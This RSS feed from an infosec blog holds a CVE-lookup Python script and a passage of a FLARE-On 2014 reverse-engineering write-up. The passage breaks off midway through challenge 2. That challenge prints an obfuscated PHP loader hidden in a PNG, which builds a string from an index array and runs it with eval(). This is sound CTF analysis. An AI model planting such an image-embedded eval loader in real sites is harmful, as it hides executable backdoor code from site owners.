<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
  <title>7h3rAm's Infosec Ramblings</title>
  <description>RSS feed for all posts.</description>
  <atom:link href="http://7h3rAm.github.io/rss.xml" rel="self" type="application/rss+xml"/>
  <link>http://7h3rAm.github.io</link>
  <language>en-us</language>
      <item>
      <title>circllu.py: Querying circl.lu API for CVE Information</title>
      <link>http://7h3rAm.github.io/2016/circllu.html</link>
      <guid>http://7h3rAm.github.io/2016/circllu.html</guid>
      <pubDate>Sat, 12 Mar 2016 00:00:00 GMT</pubDate>
      <description>&lt;pre&gt;&lt;code&gt;from pprint import pprint
import requests
import json

def circllu_cveinfo(cve=&#34;cve-2015-1234&#34;):
  customheaders = {
    &#34;User-Agent&#34;: &#34;Some script trying to be nice :)&#34;
  }
  try:
    res = requests.get(&#34;http://cve.circl.lu/api/cve/%s&#34; % (cve.upper()), headers=customheaders, verify=False)
    if res.status_code == 200:
      reply = res.json()
      if len(reply):
        return {
          &#34;success&#34;: True,
          &#34;requesturl&#34;: res.url,
          &#34;cve&#34;: cve.upper(),
          &#34;summary&#34;: reply[&#34;summary&#34;],
          &#34;references&#34;: reply[&#34;references&#34;]
        }
    return {
      &#34;success&#34;: False,
      &#34;reason&#34;: &#34;expected HTTP 200 status code but got %d instead for requesturl&#34; % (res.status_code)
    }
  except Exception as ex:
    return {
      &#34;success&#34;: False,
      &#34;exception&#34;: ex.message
    }


def circllu_cverecent(maxcves=0):
  customheaders = {
    &#34;User-Agent&#34;: &#34;Some script trying to be nice :)&#34;
  }
  try:
    res = requests.get(&#34;http://cve.circl.lu/api/last&#34;, headers=customheaders, verify=False)
    if res.status_code == 200:
      reply = json.loads(res.content)
      cves = list()
      for node in reply[&#34;results&#34;]:
        if &#34;REJECT&#34; not in node[&#34;summary&#34;]:
          cves.append(node[&#34;id&#34;])
      return {
        &#34;success&#34;: True,
        &#34;requesturl&#34;: res.url,
        &#34;cves&#34;: cves if maxcves == 0 else cves[:maxcves]
      }
    return {
      &#34;success&#34;: False,
      &#34;reason&#34;: &#34;expected HTTP 200 status code but got %d instead for requesturl&#34; % (res.status_code)
    }
  except Exception as ex:
    return {
      &#34;success&#34;: False,
      &#34;exception&#34;: ex.message
    }


def circllu_cvesearch(vendorproduct=&#34;Adobe Reader&#34;, maxcves=0):
  if not vendorproduct or vendorproduct == &#34;&#34;:
    return {
      &#34;success&#34;: False,
      &#34;usage&#34;: &#34;&amp;lt;vendor&amp;gt; &amp;lt;product&amp;gt;&#34;
    }
  customheaders = {
    &#34;User-Agent&#34;: &#34;Some script trying to be nice :)&#34;
  }
  try:
    res = requests.get(&#34;http://cve.circl.lu/api/search/%s&#34; % (&#34;/&#34;.join(vendorproduct.lower().split(&#34; &#34;))), headers=customheaders, verify=False)
    if res.status_code == 200:
      reply = json.loads(res.content)
      if len(reply):
        cves = list()
        for node in reply:
          if &#34;REJECT&#34; not in node[&#34;summary&#34;]:
            cves.append(node[&#34;id&#34;])
        return {
          &#34;success&#34;: True,
          &#34;requesturl&#34;: res.url,
          &#34;vendorproduct&#34;: &#34;/&#34;.join(vendorproduct.lower().split(&#34; &#34;)).title(),
          &#34;cves&#34;: sorted(cves, reverse=True) if maxcves == 0 else sorted(cves, reverse=True)[:maxcves]
        }
    return {
      &#34;success&#34;: False,
      &#34;reason&#34;: &#34;expected HTTP 200 status code but got %d instead for requesturl&#34; % (res.status_code)
    }
  except Exception as ex:
    return {
      &#34;success&#34;: False,
      &#34;exception&#34;: ex.message
    }


if __name__ == &#34;__main__&#34;:
  pprint(circllu_cveinfo())
  pprint(circllu_cverecent())
  pprint(circllu_cvesearch())
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Let&amp;#8217;s give this script a test run:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;{
 &#39;cve&#39;: &#39;CVE-2015-1234&#39;,
 &#39;references&#39;: [u&#39;https://codereview.chromium.org/1016193003&#39;,
                u&#39;https://code.google.com/p/chromium/issues/detail?id=468936&#39;,
                u&#39;http://www.ubuntu.com/usn/USN-2556-1&#39;,
                u&#39;http://www.securitytracker.com/id/1032012&#39;,
                u&#39;http://rhn.redhat.com/errata/RHSA-2015-0778.html&#39;,
                u&#39;http://lists.opensuse.org/opensuse-security-announce/2015-04/msg00004.html&#39;,
                u&#39;http://googlechromereleases.blogspot.com/2015/04/stable-channel-update.html&#39;],
 &#39;requesturl&#39;: u&#39;http://cve.circl.lu/api/cve/CVE-2015-1234&#39;,
 &#39;success&#39;: True,
 &#39;summary&#39;: u&#39;Race condition in gpu/command_buffer/service/gles2_cmd_decoder.cc in Google Chrome before 41.0.2272.118 allows remote attackers to cause a denial of service (buffer overflow) or possibly have unspecified other impact by manipulating OpenGL ES commands.&#39;
}

{
 &#39;cves&#39;: [u&#39;CVE-2016-2427&#39;,
          u&#39;CVE-2016-2426&#39;,
          u&#39;CVE-2016-2425&#39;,
          u&#39;CVE-2016-2424&#39;,
          u&#39;CVE-2016-2423&#39;,
          u&#39;CVE-2016-2422&#39;,
          u&#39;CVE-2016-2421&#39;,
          u&#39;CVE-2016-2420&#39;,
          u&#39;CVE-2016-2419&#39;,
          u&#39;CVE-2016-2418&#39;,
          u&#39;CVE-2016-2417&#39;,
          u&#39;CVE-2016-2416&#39;,
          u&#39;CVE-2016-2415&#39;,
          u&#39;CVE-2016-2414&#39;,
          u&#39;CVE-2016-2413&#39;,
          u&#39;CVE-2016-2412&#39;,
          u&#39;CVE-2016-2411&#39;,
          u&#39;CVE-2016-2410&#39;,
          u&#39;CVE-2016-2409&#39;,
          u&#39;CVE-2016-1503&#39;,
          u&#39;CVE-2016-0850&#39;,
          u&#39;CVE-2016-0849&#39;,
          u&#39;CVE-2016-0848&#39;,
          u&#39;CVE-2016-0847&#39;,
          u&#39;CVE-2016-0846&#39;,
          u&#39;CVE-2016-0844&#39;,
          u&#39;CVE-2016-0843&#39;,
          u&#39;CVE-2016-0842&#39;,
          u&#39;CVE-2016-0841&#39;,
          u&#39;CVE-2016-0840&#39;],
 &#39;requesturl&#39;: u&#39;http://cve.circl.lu/api/last&#39;,
 &#39;success&#39;: True
}

{
 &#39;cves&#39;: [u&#39;CVE-2011-4373&#39;,
          u&#39;CVE-2011-4372&#39;,
          u&#39;CVE-2011-4371&#39;,
          u&#39;CVE-2011-4370&#39;,
          u&#39;CVE-2010-1278&#39;,
          u&#39;CVE-2009-3459&#39;,
          u&#39;CVE-2009-1600&#39;,
          u&#39;CVE-2009-1599&#39;,
          u&#39;CVE-2009-1598&#39;,
          u&#39;CVE-2009-1597&#39;,
          u&#39;CVE-2009-1493&#39;,
          u&#39;CVE-2009-1492&#39;,
          u&#39;CVE-2009-1062&#39;,
          u&#39;CVE-2009-1061&#39;,
          u&#39;CVE-2009-0927&#39;,
          u&#39;CVE-2009-0658&#39;,
          u&#39;CVE-2009-0193&#39;,
          u&#39;CVE-2008-4817&#39;,
          u&#39;CVE-2008-4816&#39;,
          u&#39;CVE-2008-4815&#39;,
          u&#39;CVE-2008-4814&#39;,
          u&#39;CVE-2008-4813&#39;,
          u&#39;CVE-2008-4812&#39;],
 &#39;requesturl&#39;: u&#39;http://cve.circl.lu/api/search/adobe/reader&#39;,
 &#39;success&#39;: True,
 &#39;vendorproduct&#39;: &#39;Adobe/Reader&#39;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;circllu_cveinfo&lt;/code&gt; method allows querying the API for a specific CVE while returning a summary and references if the CVE is found in the database. The &lt;code&gt;circllu_cverecent&lt;/code&gt; returns a list of recently requested CVEs. And finally, the &lt;code&gt;circllu_cvesearch&lt;/code&gt; method allows you to search for a product or vendor and get listing of all reported vulnerabilities for the same. You can get this script &lt;a href=&#34;https://gist.github.com/7h3rAm/812eff486865f30c0da5c4a9d41ff73e&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
      <item>
      <title>FireEye FLARE On 2014 Challenges (1-5)</title>
      <link>http://7h3rAm.github.io/2016/flareon2014-15.html</link>
      <guid>http://7h3rAm.github.io/2016/flareon2014-15.html</guid>
      <pubDate>Thu, 18 Feb 2016 00:00:00 GMT</pubDate>
      <description>&lt;p&gt;The challenge files are available under the &lt;a href=&#34;http://www.flare-on.com/PastResults/2014/Downloads&#34;&gt;PastResults/2014/Downloads&lt;/a&gt; directory on the site or you can get a local copy of all challenges &lt;a href=&#34;/static/files/flareon2014.zip&#34;&gt;here&lt;/a&gt;. If you are into malware analysis and have worked with publicly available samples earlier, you can easily guess the password. If not consider this archive to be a challenge and try breaking the password scheme for it :)&lt;/p&gt;

&lt;p&gt;Once you get hold of the challenge files, you will find that there are total seven of them. This writeup documents the steps involved in solving challenges 1-5 and 6-7 have been left out for another post. Let&amp;#8217;s get started with the writeup now.&lt;/p&gt;

&lt;h3&gt;Challenge #1&lt;/h3&gt;

&lt;p&gt;The first challenge seems to be a PE file but let&amp;#8217;s do the initial reconnaissance to gather more details:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ file C1.exe
C1.exe: PE32+ executable (GUI) x86-64, for MS Windows
$
$ file -i C1.exe
C1.exe: application/x-dosexec; charset=binary
$
$ strings C1.exe
!This program cannot be run in DOS mode.
{K5Rich
.text
`.data
.pdata
@.idata
@.rsrc
@.reloc
Invalid parameter passed to C runtime function.
advapi32.dll
CheckTokenMembership
.INF
Reboot
AdvancedINF
Version
setupx.dll
setupapi.dll
.BAT
SeShutdownPrivilege
advpack.dll
DelNodeRunDLL32
wininit.ini
Software\Microsoft\Windows\CurrentVersion\App Paths
HeapSetInformation
...&amp;lt;snip&amp;gt;...
GetSystemMetrics
RIFF
AVI LIST
hdrlavih8
G\AN
LIST
strlstrh8
vidsRLE
strfh
vedt
JUNK
LISTv$
movi00dc(
00dc
...&amp;lt;snip&amp;gt;...
Thank you for taking the FLARE On challenge and good luck!
PBY CLICKING ON THE &#34;ACCEPT&#34; BUTTON, YOU OR THE ENTITY THAT YOU REPRESENT (&#34;LICENSEE&#34;, &#34;YOU&#34; OR END-USER&#34;) ARE UNCONDITIONALLY CONSENTING TO BE BOUND BY AND ARE BECOMING A PARTY TO THIS END USER LICENSE AGREEMENT (&#34;AGREEMENT&#34;) WITH FIREEYE, INC. AND ITS AFFILIATES (&#34;FIREEYE&#34; OR &#34;LICENSOR&#34;). IF THESE TERMS ARE
...&amp;lt;snip&amp;gt;...
&amp;lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&amp;gt;
&amp;lt;!-- Copyright (c) Microsoft Corporation --&amp;gt;
&amp;lt;assembly xmlns=&#34;urn:schemas-microsoft-com:asm.v1&#34; manifestVersion=&#34;1.0&#34;&amp;gt;
  &amp;lt;assemblyIdentity version=&#34;5.1.0.0&#34;
     processorArchitecture=&#34;amd64&#34;
     name=&#34;wextract&#34;
     type=&#34;win32&#34;/&amp;gt;
...&amp;lt;snip&amp;gt;...
&amp;lt;/assembly&amp;gt;
PPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPAD
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, the usual stuff. It is a PE file for x64 architecture. Nothing out of the ordinary here. However, upon executing this file inside a VM I found that it shows an EULA from FireEye and once you agree with terms of the license it drops a file named &lt;code&gt;Challenge1.exe&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ file Challenge1.exe
Challenge1.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So the first challenge is a &lt;code&gt;.Net&lt;/code&gt; file. Let&amp;#8217;s try executing it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;/static/files/flareon2014-c1-1.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The file shows a window with &lt;code&gt;Form1&lt;/code&gt; as its title, a funny image with a message &lt;code&gt;Let&#39;s start with something easy!&lt;/code&gt; and a huge &lt;code&gt;DECODE!&lt;/code&gt; button. Upon clicking the button, image turns awkward and message changes to some cryptic text:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;/static/files/flareon2014-c1-2.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I opened this file with &lt;a href=&#34;http://ilspy.net/&#34;&gt;ILSpy&lt;/a&gt; and found the &lt;code&gt;Form1&lt;/code&gt; object with an interesting method called &lt;code&gt;btnDecode_Click&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;/static/files/flareon2014-c1-ilspy-btndecode.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This method is the callback for the &lt;code&gt;OnClick&lt;/code&gt; eventhandler of the &lt;code&gt;DECODE!&lt;/code&gt; button we saw on the UI. Interestingly it has some loops that mangle bits and update the message with the resulting encoded text. The source message is loaded from a resource object called &lt;code&gt;dat_secret&lt;/code&gt;. You can save this object as a binary blob to a local file for further analysis:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;/static/files/flareon2014-c1-ilspy-datsecret-save.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Upon loading this binary blob, the first loop in the file performs some byte shifting and xor operations on it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;/static/files/flareon2014-c1-ilspy-deobfuscate.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Let&amp;#8217;s quickly reverse these operations before proceeding further:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ file rev_challenge_1.dat_secret.encode
rev_challenge_1.dat_secret.encode: data
$
$ wc -c rev_challenge_1.dat_secret.encode
31 rev_challenge_1.dat_secret.encode
$
$ hd rev_challenge_1.dat_secret.encode
00000000  a1 b5 44 84 14 e4 a1 b5  d4 70 b4 91 b4 70 d4 91  |..D......p...p..|
00000010  e4 c4 96 f4 54 84 b5 c4  40 64 74 70 a4 64 44     |....T...@dtp.dD|
0000001f
$
$ ipython
&amp;gt;&amp;gt;&amp;gt; with open(&#34;rev_challenge_1.dat_secret.encode&#34;, &#34;rb&#34;) as fo:
...   c = fo.read()
...
&amp;gt;&amp;gt;&amp;gt; &#34;&#34;.join([chr((ord(b) &amp;gt;&amp;gt; 4 | (ord(b) &amp;lt;&amp;lt; 4 &amp;amp; 240)) ^ 41) for b in c])
&#39;3rmahg3rd.b0b.d0ge@flare-on.com&#39;
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Alright, so the binary blob is of size 31B and has seemingly uninteresting data. On repeating the bit operations we get an email and this completes the challenge for us.&lt;/p&gt;

&lt;h3&gt;Challenge #2&lt;/h3&gt;

&lt;p&gt;This challenge has two files: a HTML and PNG respectively. From the very start of this challenge I was keen on analyzing the PNG as somewhere in the back of my mind I had this intuition that it could be a stegano challenge. As such I tried gathering more information about the PNG file:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ file home.html
home.html: HTML document, UTF-8 Unicode text, with very long lines, with CRLF line terminators
$
$ file img/flare-on.png
img/flare-on.png: PNG image data, 400 x 79, 8-bit/color RGBA, non-interlaced
$
$ exiftool img/flare-on.png
ExifTool Version Number         : 9.46
File Name                       : flare-on.png
Directory                       : img
File Size                       : 9.3 kB
File Modification Date/Time     : 2014:07:08 07:00:47+05:30
File Access Date/Time           : 2016:02:17 14:43:58+05:30
File Inode Change Date/Time     : 2016:02:15 17:49:38+05:30
File Permissions                : rw-rw-r--
File Type                       : PNG
MIME Type                       : image/png
Image Width                     : 400
Image Height                    : 79
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 4724
Pixels Per Unit Y               : 4724
Pixel Units                     : Meters
Software                        : Adobe ImageReady
Image Size                      : 400x79
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Honestly, this output depressed me a bit as there was nothing particularly interesting here. But before delving into analyzing the HTML, I decided to view the image once:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;/static/files/flareon2014-c2-1.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Ah! This left me no choice but to open the HTML and analyze the source, something I was reluctant to do. Anyways, I viewed the source and here&amp;#8217;s a snippet of interesting stuff:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&#34;utf-8&#34;&amp;gt;
    &amp;lt;title&amp;gt;The FLARE On Challenge&amp;lt;/title&amp;gt;
    &amp;lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;http://bootswatch.com/lumen/bootstrap.min.css&#34;&amp;gt;
    ...&amp;lt;snip&amp;gt;...
                  &amp;lt;p&amp;gt;The FireEye Labs Advanced Reverse Engineering (FLARE) team is an elite technical
                     group of malware analysts, researchers, and hackers. We are looking to hire smart
                     individuals interested in reverse engineering. We have created this series of binary
                     challenges to test your skills. We encourage anyone to participate and practice their
                     skills while having fun!&amp;lt;/p&amp;gt;
    ...&amp;lt;snip&amp;gt;...
    &amp;lt;?php include &#34;img/flare-on.png&#34; ?&amp;gt;
    &amp;lt;script type=&#34;text/javascript&#34;&amp;gt;
        $(document).ready(function(){
            $(&#39;#counter&#39;).countdown({
                timestamp : new Date(2014,6,7,4,0,0,0)
            });
        });
    &amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Take note of the &lt;code&gt;php include&lt;/code&gt; near bottom of the page. The PNG image is being loaded as a PHP script. This is highly deceptive and immediately reassures my initial belief that the PNG indeed has something interesting in it. I decided to open the PNG in a text editor:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;/static/files/flareon2014-c2-2.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Alright, so the PNG file has a PHP script appended to it. Let&amp;#8217;s extract and analyze this script separately:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php $terms=array(&#34;M&#34;, &#34;Z&#34;, &#34;]&#34;, &#34;p&#34;, &#34;\\&#34;, &#34;w&#34;, &#34;f&#34;, &#34;1&#34;, &#34;v&#34;, &#34;&amp;lt;&#34;, &#34;a&#34;, &#34;Q&#34;, &#34;z&#34;, &#34; &#34;, &#34;s&#34;, &#34;m&#34;, &#34;+&#34;, &#34;E&#34;, &#34;D&#34;, &#34;g&#34;, &#34;W&#34;, &#34;\&#34;&#34;, &#34;q&#34;, &#34;y&#34;, &#34;T&#34;, &#34;V&#34;, &#34;n&#34;, &#34;S&#34;, &#34;X&#34;, &#34;)&#34;, &#34;9&#34;, &#34;C&#34;, &#34;P&#34;, &#34;r&#34;, &#34;&amp;amp;&#34;, &#34;\&#39;&#34;, &#34;!&#34;, &#34;x&#34;, &#34;G&#34;, &#34;:&#34;, &#34;2&#34;, &#34;~&#34;, &#34;O&#34;, &#34;h&#34;, &#34;u&#34;, &#34;U&#34;, &#34;@&#34;, &#34;;&#34;, &#34;H&#34;, &#34;3&#34;, &#34;F&#34;, &#34;6&#34;, &#34;b&#34;, &#34;L&#34;, &#34;&amp;gt;&#34;, &#34;^&#34;, &#34;,&#34;, &#34;.&#34;, &#34;l&#34;, &#34;$&#34;, &#34;d&#34;, &#34;`&#34;, &#34;%&#34;, &#34;N&#34;, &#34;*&#34;, &#34;[&#34;, &#34;0&#34;, &#34;}&#34;, &#34;J&#34;, &#34;-&#34;, &#34;5&#34;, &#34;_&#34;, &#34;A&#34;, &#34;=&#34;, &#34;{&#34;, &#34;k&#34;, &#34;o&#34;, &#34;7&#34;, &#34;#&#34;, &#34;i&#34;, &#34;I&#34;, &#34;Y&#34;, &#34;(&#34;, &#34;j&#34;, &#34;/&#34;, &#34;?&#34;, &#34;K&#34;, &#34;c&#34;, &#34;B&#34;, &#34;t&#34;, &#34;R&#34;, &#34;4&#34;, &#34;8&#34;, &#34;e&#34;, &#34;|&#34;);
$order=array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47);
$do_me=&#34;&#34;;
for($i=0;$i&amp;lt;count($order);$i++){
    $do_me=$do_me.$terms[$order[$i]];
}
eval($do_me); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The first thing I did was to port the PHP code to Python and here&amp;#8217;s the result:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ipython
&amp;gt;&amp;gt;&amp;gt; terms = [&#34;M&#34;, &#34;Z&#34;, &#34;]&#34;, &#34;p&#34;, &#34;\\&#34;, &#34;w&#34;, &#34;f&#34;, &#34;1&#34;, &#34;v&#34;, &#34;&amp;lt;&#34;, &#34;a&#34;, &#34;Q&#34;, &#34;z&#34;, &#34; &#34;, &#34;s&#34;, &#34;m&#34;, &#34;+&#34;, &#34;E&#34;, &#34;D&#34;, &#34;g&#34;, &#34;W&#34;, &#34;\&#34;&#34;, &#34;q&#34;, &#34;y&#34;, &#34;T&#34;, &#34;V&#34;, &#34;n&#34;, &#34;S&#34;, &#34;X&#34;, &#34;)&#34;, &#34;9&#34;, &#34;C&#34;, &#34;P&#34;, &#34;r&#34;, &#34;&amp;amp;&#34;, &#34;\&#39;&#34;, &#34;!&#34;, &#34;x&#34;, &#34;G&#34;, &#34;:&#34;, &#34;2&#34;, &#34;~&#34;, &#34;O&#34;, &#34;h&#34;, &#34;u&#34;, &#34;U&#34;, &#34;@&#34;, &#34;;&#34;, &#34;H&#34;, &#34;3&#34;, &#34;F&#34;, &#34;6&#34;, &#34;b&#34;, &#34;L&#34;, &#34;&amp;gt;&#34;, &#34;^&#34;, &#34;,&#34;, &#34;.&#34;, &#34;l&#34;, &#34;$&#34;, &#34;d&#34;, &#34;`&#34;, &#34;%&#34;, &#34;N&#34;, &#34;*&#34;, &#34;[&#34;, &#34;0&#34;, &#34;}&#34;, &#34;J&#34;, &#34;-&#34;, &#34;5&#34;, &#34;_&#34;, &#34;A&#34;, &#34;=&#34;, &#34;{&#34;, &#34;k&#34;, &#34;o&#34;, &#34;7&#34;, &#34;#&#34;, &#34;i&#34;, &#34;I&#34;, &#34;Y&#34;, &#34;(&#34;, &#34;j&#34;, &#34;/&#34;, &#34;?&#34;, &#34;K&#34;, &#34;c&#34;, &#34;B&#34;, &#34;t&#34;, &#34;R&#34;, &#34;4&#34;, &#34;8&#34;, &#34;e&#34;, &#34;|&#34;]
&amp;gt;&amp;gt;&amp;gt;
&amp;gt;&amp;gt;&amp;gt; order = [59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 